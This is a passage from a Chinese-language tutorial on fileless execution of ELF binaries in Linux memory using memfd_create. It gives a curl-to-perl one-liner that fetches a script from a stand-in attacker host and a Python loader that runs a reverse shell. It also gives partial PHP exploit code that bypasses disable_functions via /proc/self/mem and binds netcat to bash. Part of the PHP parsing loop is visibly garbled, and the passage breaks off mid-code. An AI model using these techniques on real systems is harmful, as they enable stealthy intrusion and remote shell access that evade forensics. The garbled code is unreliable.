新创建的进程不会以`/proc/PID/fd`符号链接形式打开匿名文件，但我们还是能通过`/proc/PID/exe`符号链接看到我们的ELF文件，该符号链接指向的是进程正在执行的文件。
现在我们已经实现在Linux内存中执行ELF文件，不会在磁盘或者文件系统中留下任何痕迹。为了尽快且方便地加载可执行文件，我们可以将带有ELF文件的脚本通过管道交给Perl解释器执行：
    $ curl http://attacker/evil_elf.pl | perl
## 四、Python
与Perl类似，在Python中我们也可以执行如下操作：
  * 使用`memfd_create()`系统调用来创建匿名文件
  * 使用可执行ELF文件填充该文件
  * 执行该文件，也可以使用`fork()`多次执行该文件
    import ctypes
    import os
    # read the executable file. It is a reverse shell in our case
    binary = open('/tmp/rev-shell','rb').read()
    fd = ctypes.CDLL(None).syscall(319,"",1) # call memfd_create and create an anonymous file
    final_fd = open('/proc/self/fd/'+str(fd),'wb') # write our executable file.
    final_fd.write(binary)
    final_fd.close()
    fork1 = os.fork() #create a child
    if 0 != fork1: os._exit(0)
    ctypes.CDLL(None).syscall(112) # call setsid() to create a parent.
    fork2 = os.fork() #create a child from the parent. 
    if 0 != fork2: os._exit(0)
    os.execl('/proc/self/fd/'+str(fd),'argv0','argv1') # run our payload.
为了在python中调用`syscall`，我们需要标准的[ctypes](https://docs.python.org/2/library/ctypes.html)以及[os](https://docs.python.org/2/library/os.html)库，以便写入并执行文件、管理进程。所有操作步骤都与perl类似。
在如上代码中，我们读取的是位于`/tmp/`目录中的一个文件，我们也可以选择从web服务器远程加载该文件。
## 五、PHP
前面我们已经分析过perl以及python的实现代码。许多操作系统默认情况下会安装这些语言的解释器，下面让我们讨论最为有趣的一种场景。如果由于各种因素影响，我们无法使用perl以及python解释器，那么可以考虑使用PHP。这种语言在web开发者中非常流行，如果我们可以在web应用执行代码，那么很有可能就会碰到PHP解释器。
遗憾的是，php并没有处理`syscall`的内置机制。
Beched之前在rdot论坛上发表过一篇[文章](https://rdot.org/forum/showthread.php?t=3309)，文中使用[procfs](http://man7.org/linux/man-pages/man5/proc.5.html)（`/proc/self/mem`）在当前进程内存空间中将`open`重写为`system`，从而绕过`disable_functions`的限制。
我们使用了这种技巧来重写代码中涉及到系统调用的一些函数。
我们以shellcode的形式将`syscall`传递给php解释器，使用一系列命令来传递系统调用。
接下来我们一步一步实现PHP代码，这个过程中涉及到一些小技巧。
首先，我们设定所需的一些参数：
        $elf = file_get_contents("/bin/nc.traditional"); // elf_payload
        $args = "test -lvvp 31338 -e /bin/bash";  // argv0 argv1 argv2 ...
然后指定偏移地址：内存中的高位（higher）及低位（lower）值，以便后面注入shellcode：
        function packlli($value) {
                $higher = ($value & 0xffffffff00000000) >> 32;
                $lower = $value & 0x00000000ffffffff;
                return pack('V2', $lower, $higher);
        }
然后构造用来“unpack”二进制文件的一个函数，先执行[反转](http://www.php.su/strrev)操作，然后依次执行[bin2hex()](http://php.net/manual/ru/function.bin2hex.php)、[hexdex()](http://php.net/manual/ru/function.hexdec.php)，将二进制数值转化为十进制数值，为后面注入内存做准备：
    function unp($value) {
            return hexdec(bin2hex(strrev($value)));
        }
然后解析ELF文件，获取偏移值：
    function parseelf($bin_ver, $rela = false) {
        $bin = file_get_contents($bin_ver);
        $e_shoff = unp(substr($bin, 0x28, 8));
        $e_shentsize = unp(substr($bin, 0x3a, 2));
        $e_shnum = unp(substr($bin, 0x3c, 2));
        $e_shstrndx = unp(substr($bin, 0x3e, 2));
        for($i = 0; $i > 32;
                $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
                $name = '';
                $j = $strtab_off + $name_off - 1;
                while($bin[++$j] != "") {
                    $name .= $bin[$j];
                }
                if($name == 'open') {
                    return $r_offset;
                }
            }
        }
        else {
            for($i = $dynsym_off; $i < $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
                $name_off = unp(substr($bin, $i, 4));
                $name = '';
                $j = $strtab_off + $name_off - 1;
                while($bin[++$j] != "") {
                    $name .= $bin[$j];
                }
                if($name == '__libc_system') {
                    $system_offset = unp(substr($bin, $i + 8, 8));
                }
                if($name == '__open') {
                    $open_offset = unp(substr($bin, $i + 8, 8));
                }
            }
            return array($system_offset, $open_offset);
        }
此外我们还需要定义已安装的PHP版本信息：
    if (!defined('PHP_VERSION_ID')) {
        $version = explode('.', PHP_VERSION);
        define('PHP_VERSION_ID', ($version[0] * 10000 + $version[1] * 100 + $version[2]));
    }
    if (PHP_VERSION_ID < 50207) {
        define('PHP_MAJOR_VERSION',   $version[0]);
        define('PHP_MINOR_VERSION',   $version[1]);
        define('PHP_RELEASE_VERSION', $version[2]);
    }
    echo "[INFO] PHP major version " . PHP_MAJOR_VERSION . "n";
检查操作系统类型及Linux内核版本：
    if(strpos(php_uname('a'), 'x86_64') === false) {
        echo "[-] This exploit is for x64 Linux. Exitingn";
        exit;
    }
    if(substr(php_uname('r'), 0, 4) < 2.98) {
        echo "[-] Too old kernel (< 2.98). Might not workn";
    }
我们重写了`open[@plt](https://github.com/plt
"@plt")`的地址，以便绕过`disable_functions`限制。我们适当修改了beched的代码，现在可以将shellcode注入内存中。
首先我们需要在二进制文件中找到PHP解释器的地址，为了完成这个任务，我们可以运行`/proc/self/exe`，然后使用`parseelf()`解析可执行文件：
    echo "[INFO] Trying to get open@plt offset in PHP binaryn";
    $open_php = parseelf('/proc/self/exe', true);
    if($open_php == 0) {
        echo "[-] Failed. Exitingn";
        exit;
    }
    echo '[+] Offset is 0x' . dechex($open_php) . "n";
    $maps = file_get_contents('/proc/self/maps');
    preg_match('#s+(/.+libc-.+)#', $maps, $r);
    echo "[INFO] Libc location: $r[1]n";